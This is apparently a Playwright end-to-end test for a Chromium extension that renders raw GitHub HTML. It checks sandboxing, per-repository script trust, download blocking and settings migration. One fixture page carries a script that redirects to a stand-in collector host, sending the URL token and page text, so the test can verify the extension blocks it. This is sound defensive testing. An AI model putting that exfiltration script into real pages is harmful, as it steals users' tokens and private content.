import test from 'node:test';
import assert from 'node:assert/strict';
import { chromium } from 'playwright';
import { cp, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';
import https from 'node:https';
import http from 'node:http';
import net from 'node:net';
import { fileURLToPath } from 'node:url';
import { makeRules } from '../extension/config.js';

const root=fileURLToPath(new URL('../',import.meta.url));
const extensionSource=join(root,'extension');
const fixture='<!doctype html><html lang="en"><head><title>Artifact fixture</title></head><body><h1 id="requirement-1">Interactive artifact</h1><button id="increment">Count: 0</button><script>let count=0;document.querySelector("button").onclick=()=>document.querySelector("button").textContent="Count: "+(++count);</script></body></html>';
const listen=server=>new Promise(resolve=>server.listen(0,'127.0.0.1',()=>resolve(server.address().port)));
const close=server=>new Promise(resolve=>server.close(resolve));

test('real Chromium extension: repository configuration, rendering, privacy, persistence and pause', {timeout:120000},async t=>{
 const temporary=await mkdtemp(join(tmpdir(),'html-artifact-viewer-'));
 const extension=join(temporary,'extension');
 await cp(extensionSource,extension,{recursive:true});
 const requests=[];
 const collected=[];
 const key=join(temporary,'key.pem'),cert=join(temporary,'cert.pem');
 execFileSync('openssl',['req','-x509','-newkey','rsa:2048','-nodes','-keyout',key,'-out',cert,'-days','1','-subj','/CN=raw.githubusercontent.com'],{stdio:'ignore'});
 const fixtureServer=https.createServer({key:await readFile(key),cert:await readFile(cert)},async(req,res)=>{
   requests.push(req.url.split('?')[0]);
   if (req.url.startsWith('/collect')) { collected.push(req.url); res.writeHead(200, {'content-type':'text/plain'}); res.end('Local synthetic collector'); return; }
   if (req.url.startsWith('/acme/artifacts/main/attack.html')) {
     res.writeHead(200, {'content-type':'text/plain', 'content-security-policy':"default-src 'none'; sandbox"});
     res.end(`<!doctype html><body>PRIVATE_SYNTHETIC_DOCUMENT<script>location.replace('https://collector.example/collect?token='+encodeURIComponent(new URL(location.href).searchParams.get('token'))+'&body='+encodeURIComponent(document.body.innerText))</script>`); return;
   }
   if (req.url.startsWith('/acme/artifacts/main/download.html')) {
     res.writeHead(200, {'content-type':'text/plain', 'content-security-policy':"default-src 'none'; sandbox"});
     res.end(`<!doctype html><body><button>Export</button><script>function download(){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob(['synthetic file']));a.download='automatic.txt';a.click();document.body.dataset.attempted='true';}document.querySelector('button').onclick=download;download();</script>`); return;
   }
   const content=req.url.split('?')[0].endsWith('/docs/product-design.html')
     ? await readFile(join(root,'docs/product-design.html'),'utf8') : fixture;
   res.writeHead(200,{'content-type':'text/plain; charset=utf-8','content-security-policy':"default-src 'none'; sandbox",'x-content-type-options':'nosniff'});res.end(content);
 });
 const port=await listen(fixtureServer);
 const tunnels=new Set();
 const proxy=http.createServer((_req,res)=>{res.writeHead(403);res.end();});
 proxy.on('connect',(req,client,head)=>{
   client.on('error',()=>client.destroy());
   if(!['raw.githubusercontent.com:443','collector.example:443'].includes(req.url)) {client.end('HTTP/1.1 403 Forbidden\r\n\r\n');return;}
   const upstream=net.connect(port,'127.0.0.1',()=>{client.write('HTTP/1.1 200 Connection Established\r\n\r\n');if(head.length) upstream.write(head);client.pipe(upstream);upstream.pipe(client);});
   for(const socket of [client,upstream]) {tunnels.add(socket);socket.on('close',()=>tunnels.delete(socket));socket.on('error',()=>{client.destroy();upstream.destroy();});}
 });
 const proxyPort=await listen(proxy);
 const launch=()=>chromium.launchPersistentContext(join(temporary,'profile'),{channel:'chromium',headless:true,viewport:{width:1180,height:850},args:[`--disable-extensions-except=${extension}`,`--load-extension=${extension}`,`--proxy-server=http://127.0.0.1:${proxyPort}`,'--ignore-certificate-errors','--disable-background-networking'],ignoreHTTPSErrors:true});
 let context;
 try {
   context=await launch();
   const worker=context.serviceWorkers()[0] || await context.waitForEvent('serviceworker');
   const id=new URL(worker.url()).host;
   const settings=await context.newPage();await settings.goto(`chrome-extension://${id}/settings.html`);
   await settings.getByText('Add a repository to get started.').waitFor();
   const artifact=await context.newPage();
   const url='https://raw.githubusercontent.com/acme/artifacts/main/example.html?token=synthetic';
   await artifact.goto(url);assert.equal(await artifact.locator('h1').count(),0);
   await settings.getByLabel('Where should HTML come to life?').fill('https://github.com/acme/artifacts/\nacme/artifacts');
   await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 1 repository enabled.').waitFor();
   await artifact.reload();await artifact.getByRole('heading',{name:'Interactive artifact'}).waitFor();
   await artifact.getByRole('button',{name:'Count: 0'}).click();
   assert.equal(await artifact.getByRole('button',{name:'Count: 0'}).count(),1);
   assert.equal(await settings.getByLabel('Allow scripts in acme/artifacts', {exact:true}).isChecked(),false);
   const attack=await context.newPage();
   const attackURL='https://raw.githubusercontent.com/acme/artifacts/main/attack.html?token=SYNTHETIC_PRIVATE_TOKEN';
   await attack.goto(attackURL);
   assert.equal(attack.url(),attackURL);assert.equal(collected.length,0);
   await settings.getByLabel('Allow scripts in acme/artifacts', {exact:true}).check();
   await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 1 repository enabled.').waitFor();
   await artifact.reload();await artifact.getByRole('button',{name:'Count: 0'}).click();await artifact.getByRole('button',{name:'Count: 1'}).waitFor();
   await t.test('explicit script trust permits navigation; revoking it prevents script exfiltration',async()=>{
     await attack.reload().catch(()=>{});await attack.waitForURL('https://collector.example/**');
     assert.equal(collected.length,1);assert.ok(collected[0].includes('SYNTHETIC_PRIVATE_TOKEN'));assert.ok(collected[0].includes('PRIVATE_SYNTHETIC_DOCUMENT'));
     await settings.getByLabel('Allow scripts in acme/artifacts', {exact:true}).uncheck();
     await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 1 repository enabled.').waitFor();
     await attack.goto(attackURL);assert.equal(attack.url(),attackURL);assert.equal(collected.length,1);
     await settings.getByLabel('Allow scripts in acme/artifacts', {exact:true}).check();
     await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 1 repository enabled.').waitFor();
   });
   await t.test('trusted scripts cannot download automatically or on click',async()=>{
     const page=await context.newPage();const downloads=[];page.on('download',download=>downloads.push(download));
     await page.goto('https://raw.githubusercontent.com/acme/artifacts/main/download.html');
     assert.equal(await page.locator('body').getAttribute('data-attempted'),'true');
     await page.getByRole('button',{name:'Export'}).click();
     await assert.rejects(page.waitForEvent('download',{timeout:500}),/Timeout/);
     assert.equal(downloads.length,0);await page.close();
   });
   const storage=await worker.evaluate(()=>chrome.storage.local.get());assert.deepEqual(storage.settings.repositories,['acme/artifacts']);assert.equal(JSON.stringify(storage).includes('synthetic'),false);
   const isolation=await artifact.evaluate(()=>({extension:typeof chrome==='undefined'||!chrome.runtime,storage:(()=>{try{localStorage.getItem('x');return false;}catch{return true;}})()}));
   assert.deepEqual(isolation,{extension:true,storage:true});
   const outside=await context.newPage();await outside.goto('https://raw.githubusercontent.com/acme/artifacts-other/main/example.html');assert.equal(await outside.locator('h1').count(),0);
   const json=await context.newPage();await json.goto('https://raw.githubusercontent.com/acme/artifacts/main/example.json');assert.equal(await json.locator('h1').count(),0);
   await settings.getByLabel('Where should HTML come to life?').fill('acme/*');await settings.getByRole('button',{name:'Save repositories'}).click();await settings.locator('#status[data-error="true"]').waitFor();
   await artifact.reload();assert.equal(await artifact.locator('h1').count(),1);
   const n=requests.length;
   const fetchBlocked=await artifact.evaluate(async()=>{try{await fetch('https://raw.githubusercontent.com/acme/artifacts/main/leak.html');return false;}catch{return true;}});assert.equal(fetchBlocked,true);assert.equal(requests.length,n);
   await settings.reload();await settings.getByText('Your settings are loaded.').waitFor();
   await settings.getByLabel('Enable HTML previews').uncheck();await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. Previews are paused.').waitFor();
   await artifact.reload();assert.equal(await artifact.locator('h1').count(),0);
   await settings.getByLabel('Enable HTML previews').check();await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 1 repository enabled.').waitFor();
   await settings.getByLabel('Where should HTML come to life?').fill('acme/artifacts\nEpiphanyMachine/html-artifact-viewer');await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 2 repositories enabled.').waitFor();
   assert.equal(await settings.getByLabel('Allow scripts in epiphanymachine/html-artifact-viewer', {exact:true}).isChecked(),false);
   await settings.getByLabel('Allow scripts in epiphanymachine/html-artifact-viewer', {exact:true}).check();
   await settings.getByRole('button',{name:'Save repositories'}).click();await settings.getByText('Saved. 2 repositories enabled.').waitFor();
   await settings.setViewportSize({width:390,height:844});assert.ok(await settings.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
   await settings.emulateMedia({colorScheme:'dark'});assert.ok(await settings.getByRole('button',{name:'Save repositories'}).isVisible());
   await context.close();context=null;
   context=await launch();const persisted=await context.newPage();await persisted.goto(url);await persisted.getByRole('heading',{name:'Interactive artifact'}).waitFor();
   await t.test('dynamic rules survive a browser restart',()=>assert.equal(context.pages().length>0,true));
   await t.test('portable product/design artifact renders and works inside the preview sandbox',async()=>{
     const page=await context.newPage();const errors=[];page.on('pageerror',error=>errors.push(error.message));
     await page.goto('https://raw.githubusercontent.com/EpiphanyMachine/html-artifact-viewer/gh/initial-viewer/docs/product-design.html');
     await page.getByRole('heading',{name:'Requirements you can verify'}).waitFor();
     assert.equal(await page.locator('.masthead img').evaluate(img=>img.complete&&img.naturalWidth>0),true);
     await page.getByRole('button',{name:'Source',exact:true}).click();assert.equal(await page.locator('#source-view').isVisible(),true);
     await page.getByRole('button',{name:'Rendered',exact:true}).click();assert.equal(await page.locator('#rendered-view').isVisible(),true);
     await page.getByRole('button',{name:'Try allowing this repository'}).click();await page.getByText('Renders as a page',{exact:true}).waitFor();
     await page.getByLabel('Enable HTML previews',{exact:true}).uncheck();await page.getByText('Previews are paused',{exact:true}).waitFor();
     await page.emulateMedia({colorScheme:'dark'});await page.getByRole('button',{name:'Switch to light theme'}).click();
     assert.equal(await page.locator('html').getAttribute('data-theme'),'light');
     await page.getByRole('button',{name:'Switch to dark theme'}).click();assert.equal(await page.locator('html').getAttribute('data-theme'),'dark');
     await page.locator('#try-it').getByRole('link',{name:'REQ-3',exact:true}).click();assert.equal(new URL(page.url()).hash,'#req-3');
     for(const width of [1280,390]) {
       await page.setViewportSize({width,height:900});assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
     }
     assert.deepEqual(errors,[]);
     const offline=await context.newPage();const networkRequests=[];
     await offline.route('**/*',route=>{
       if(route.request().url().startsWith('file:')) return route.continue();
       networkRequests.push(route.request().url());return route.abort();
     });
     await offline.goto(new URL('../docs/product-design.html',import.meta.url).href);
     await offline.getByRole('button',{name:'Try allowing this repository'}).click();await offline.getByText('Renders as a page',{exact:true}).waitFor();
     assert.equal(await offline.locator('.masthead img').evaluate(img=>img.complete&&img.naturalWidth>0),true);
     assert.deepEqual(networkRequests,[]);
   });
   await t.test('removing and re-adding a repository does not restore its script permission',async()=>{
     const options=await context.newPage();await options.goto(`chrome-extension://${id}/settings.html`);
     await options.getByText('Your settings are loaded.').waitFor();
     assert.equal(await options.getByLabel('Allow scripts in acme/artifacts', {exact:true}).isChecked(),true);
     await options.getByLabel('Where should HTML come to life?').fill('EpiphanyMachine/html-artifact-viewer');
     await options.getByRole('button',{name:'Save repositories'}).click();await options.getByText('Saved. 1 repository enabled.').waitFor();
     await options.getByLabel('Where should HTML come to life?').fill('EpiphanyMachine/html-artifact-viewer\nacme/artifacts');
     assert.equal(await options.getByLabel('Allow scripts in acme/artifacts', {exact:true}).isChecked(),false);
     await options.getByRole('button',{name:'Save repositories'}).click();await options.getByText('Saved. 2 repositories enabled.').waitFor();
     const page=await context.newPage();await page.goto(attackURL);assert.equal(page.url(),attackURL);assert.equal(collected.length,1);
   });
   await t.test('extension version update migrates legacy settings and replaces persisted permissive rules',async()=>{
     const current=context.serviceWorkers()[0];
     await current.evaluate(async rules=>{
       const previous=await chrome.declarativeNetRequest.getDynamicRules();
       await chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:previous.map(rule=>rule.id),addRules:rules});
       await chrome.storage.local.set({settings:{enabled:true,repositories:['acme/artifacts']}});
     },makeRules({enabled:true,repositories:['acme/artifacts'],scriptRepositories:['acme/artifacts']}));
     await context.close();context=null;
     const manifest=JSON.parse(await readFile(join(extension,'manifest.json'),'utf8'));
     manifest.version='0.2.1';await writeFile(join(extension,'manifest.json'),JSON.stringify(manifest));
     context=await launch();
     const updated=context.serviceWorkers()[0] || await context.waitForEvent('serviceworker');
     const options=await context.newPage();await options.goto(`chrome-extension://${id}/settings.html`);
     await options.getByText('Your settings are loaded.').waitFor();
     assert.equal(await options.getByLabel('Allow scripts in acme/artifacts', {exact:true}).isChecked(),false);
     const migrated=await updated.evaluate(async()=>({storage:await chrome.storage.local.get('settings'),rules:await chrome.declarativeNetRequest.getDynamicRules()}));
     assert.deepEqual(migrated.storage.settings.scriptRepositories,[]);
     assert.ok(migrated.rules[0].action.responseHeaders.find(header=>header.header.toLowerCase()==='content-security-policy').value.includes("script-src 'none'"));
     const page=await context.newPage();await page.goto(attackURL);assert.equal(page.url(),attackURL);assert.equal(collected.length,1);
   });
 } finally {
   if(context) await context.close();
   for(const socket of tunnels) socket.destroy();
   fixtureServer.closeAllConnections();proxy.closeAllConnections();
   await Promise.all([close(fixtureServer),close(proxy)]);await rm(temporary,{recursive:true,force:true});
 }
});
